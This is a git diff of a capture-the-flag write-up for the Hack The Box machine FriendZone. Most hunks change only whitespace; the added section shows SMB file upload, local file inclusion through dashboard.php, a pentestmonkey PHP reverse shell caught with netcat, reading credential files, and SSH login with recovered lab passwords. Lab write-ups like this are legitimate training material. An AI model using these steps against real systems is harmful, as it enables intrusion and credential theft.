@@ -138,9 +138,9 @@ Notes:
          ```
          - While inside the client:
            ```console
-           dir
-           
+           dir     
            # creds.txt      N     57  Wed Oct 10 07:52:42 2018
+           
            get creds.txt
            ```
          - __creds.txt__ contents:
@@ -156,7 +156,6 @@ Notes:
          - While inside the client:
            ```console
            dir
-           
            # .              D      0  Thu Jan 17 04:03:49 2019
            # ..             D      0  Thu Jan 24 05:51:02 2019
            ```
@@ -295,7 +294,7 @@ Notes:
    1. Enumeration:
       ```console
       dig @10.10.10.123 friendzone.red axfr
-      
+    
       # friendzone.red.                 604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
       # friendzone.red.                 604800  IN     AAAA    ::1
       # friendzone.red.                 604800  IN     NS      localhost.
@@ -447,6 +446,7 @@ Notes:
      ```
      Notes:
      - __dashboard.php__ gets the filename of PHP files and then adds the extension __.php__
+     - __dashboard.php__ runs the file from the pagename parameter
      - Upload a malicious PHP file and access it using __dashboard.php__
    
 2. Explore https://uploads.friendzone.red
@@ -482,11 +482,9 @@ Notes:
    - Find the uploaded files
      ```console
      gobuster -k -u https://uploads.friendzone.red/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt 
-     
      # /files (Status: 301)
      
      gobuster -k -u https://uploads.friendzone.red/files -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
-     
      # /note (Status: 200)
      ```
      Visiting https://uploads.friendzone.red/files/note
@@ -504,7 +502,6 @@ Notes:
      While inside the client:
      ``` console
      dir
-
      # .              D      0  Thu Jan 17 04:03:49 2019
      # ..             D      0  Thu Jan 24 05:51:02 2019
      ```
@@ -552,3 +549,90 @@ Notes:
      - https://uploads.friendzone.red is actually a dead end
      
 4. Linking the __Development share__ and __dashboard.php__
+   - Upload __test.php__ directly to the __Development share__
+     ```console
+     smbclient \\\\WORKGROUP\\Development -c "put test.php test.php" -I 10.10.10.123 -N   
+     # putting file test.php as \test.php (0.0 kb/s) (average 0.0 kb/s)
+     ```
+     Notes:
+     - __/etc/Files__ was commented for the __Files share__ during share enumeration in `enum4linux`
+     - Maybe files in the __Development share__ are saved in __/etc/Development__
+     
+   - Attempt LFI at the __/etc/Development__ directory using __dashboard.php__
+     ```
+     /dashboard.php?image_id=a.jpg&pagename=/etc/Development/test
+     ```
+     Page Source:
+     ```html
+     <title>FriendZone Admin !</title>
+     <br><br><br>
+     <center><h2>Smart photo script for friendzone corp !</h2></center>
+     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>
+     <center><img src='images/a.jpg'></center>
+     <center><h1>Something went worng ! , the script include wrong param !</h1></center>
+     hello world
+     ```
+     Notes:
+     - The files in the __Development share__ are indeed saved in /etc/Development
+     
+   - Upload PHP reverse shell
+     - Download shell from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+     - Update values __$ip__ and __$port__
+     - Upload to the __Development share__
+       ```console
+       smbclient \\\\WORKGROUP\\Development -c "put shell.php shell.php" -I 10.10.10.123 -N
+       # putting file shell.php as \shell.php (7.0 kb/s) (average 7.0 kb/s)
+       ```
+   - Establish shell
+     - Set-up local __netcat listener__:
+       ```console
+       nc -lvp 4444
+       ```
+     - Run shell using __dashboard.php__:
+       ```
+       https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell
+       ```
+   - While inside the shell:
+     ```console
+     id
+     # uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+     cat /etc/passwd | grep bash
+     # root:x:0:0:root:/root:/bin/bash
+     # friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
+
+     find /var/www -name *conf* 2>/dev/null
+     # /var/www/mysql_data.conf
+     
+     cat /var/www/mysql_data.conf
+     ```
+     __/var/www/mysql_data.conf__ contents:
+     ```
+     for development process this is the mysql creds for user friend
+
+     db_user=friend
+
+     db_pass=Agpyu12!0.213$
+
+     db_name=FZ
+     ```
+     Notes:
+     - There exists a user named __friend__
+     - There are credentials for __friend__ in /var/www/mysql_data.conf
+     
+5. Login via SSH as user (__friend__)
+   ```console
+   ssh -l friend 10.10.10.123
+   # friend@10.10.10.123's password: Agpyu12!0.213$
+   ```
+   - While inside shell:
+     ```console
+     find ~ -name user.txt
+     # /home/friend/user.txt
+     
+     cat /home/friend/user.txt
+     # a9ed20acecd6c5b6b52f474e15ae9a11
+     ```
+---
+## PART 4 : Privilege Escalation (friend -> root)
+   
